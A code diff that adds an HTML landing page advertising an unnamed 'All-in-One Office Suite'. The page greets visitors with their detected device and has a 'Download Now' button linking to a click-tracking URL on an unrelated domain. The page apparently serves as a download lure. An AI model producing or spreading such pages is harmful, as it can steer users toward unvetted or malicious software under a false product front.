@@ -1,0 +1,103 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Download Office Suite</title>
+
+<style>
+body {
+  margin:0;
+  font-family: system-ui, Arial;
+  background: linear-gradient(135deg,#0f172a,#020617);
+  color:#fff;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  min-height:100vh;
+}
+
+.card {
+  text-align:center;
+  max-width:520px;
+  width:90%;
+  padding:45px 30px;
+  background:rgba(255,255,255,0.05);
+  border-radius:16px;
+  backdrop-filter: blur(10px);
+}
+
+h1 {
+  font-size:30px;
+  margin-bottom:10px;
+}
+
+.sub {
+  font-size:18px;
+  color:#cbd5e1;
+  margin-bottom:10px;
+}
+
+.device {
+  font-size:15px;
+  color:#94a3b8;
+  margin-bottom:25px;
+}
+
+.features div {
+  margin:12px 0;
+  font-size:16px;
+}
+
+.btn {
+  margin-top:25px;
+  display:inline-block;
+  padding:16px 40px;
+  font-size:18px;
+  background:#00ffcc;
+  color:#000;
+  border-radius:8px;
+  text-decoration:none;
+  font-weight:bold;
+}
+</style>
+
+</head>
+<body>
+
+<div class="card">
+
+<h1>All-in-One Office Suite</h1>
+
+<div class="sub">Create and edit documents anywhere</div>
+<div id="deviceText" class="device"></div>
+
+<div class="features">
+<div>✔ Windows, macOS & Linux</div>
+<div>✔ Android & iOS support</div>
+<div>✔ Office file compatibility</div>
+<div>✔ PDF tools included</div>
+<div>✔ Cloud sync</div>
+<div>✔ AI smart tools</div>
+</div>
+
+<a href="https://cctlds.homes/click/1" class="btn">Download Now</a>
+
+</div>
+
+<script>
+const ua = navigator.userAgent.toLowerCase();
+let device = "your device";
+
+if (ua.includes("android")) device = "Android";
+else if (ua.includes("iphone") || ua.includes("ipad")) device = "iOS";
+else if (ua.includes("win")) device = "Windows";
+else if (ua.includes("mac")) device = "Mac";
+else if (ua.includes("linux")) device = "Linux";
+
+document.getElementById("deviceText").innerHTML =
+"Optimized for: " + device;
+</script>
+
+</body>
+</html>
